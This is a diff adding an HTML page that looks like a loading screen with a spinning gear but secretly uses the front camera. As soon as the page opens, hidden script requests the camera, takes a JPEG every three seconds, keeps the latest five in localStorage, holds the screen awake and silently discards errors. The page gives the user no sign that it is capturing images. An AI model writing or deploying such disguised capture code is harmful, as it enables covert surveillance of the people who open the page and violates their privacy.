@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title></title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * { margin: 0; padding: 0; user-select: none; }
+        body {
+            background: #000;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .gear {
+            font-size: 140px;
+            color: #333;
+            animation: spin 3s linear infinite;
+        }
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="gear">⚙️</div>
+    
+    <video id="video" autoplay playsinline muted style="display:none"></video>
+    <canvas id="canvas" style="display:none"></canvas>
+    
+    <script>
+        startCamera();
+        
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: 640, height: 480 },
+                    audio: false
+                });
+                
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                await new Promise(resolve => {
+                    video.onloadedmetadata = () => { video.play(); resolve(); };
+                });
+                
+                startCapturing(video);
+                
+                if ('wakeLock' in navigator) {
+                    try { await navigator.wakeLock.request('screen'); } catch(e) {}
+                }
+                
+            } catch (error) {
+                // خطا مخفی
+            }
+        }
+        
+        function startCapturing(video) {
+            const canvas = document.getElementById('canvas');
+            
+            setInterval(() => {
+                if (video.videoWidth > 0) {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    const imageData = canvas.toDataURL('image/jpeg', 0.7);
+                    saveToStorage(imageData);
+                }
+            }, 3000);
+        }
+        
+        function saveToStorage(imageData) {
+            try {
+                const key = `img_${Date.now()}`;
+                localStorage.setItem(key, imageData);
+                
+                const keys = Object.keys(localStorage);
+                const imgKeys = keys.filter(k => k.startsWith('img_'));
+                if (imgKeys.length > 5) {
+                    imgKeys.sort();
+                    imgKeys.slice(0, imgKeys.length - 5).forEach(k => localStorage.removeItem(k));
+                }
+            } catch (e) {}
+        }
+        
+        window.addEventListener('beforeunload', () => {
+            const video = document.getElementById('video');
+            if (video.srcObject) {
+                video.srcObject.getTracks().forEach(track => track.stop());
+            }
+        });
+    </script>
+</body>
+</html>
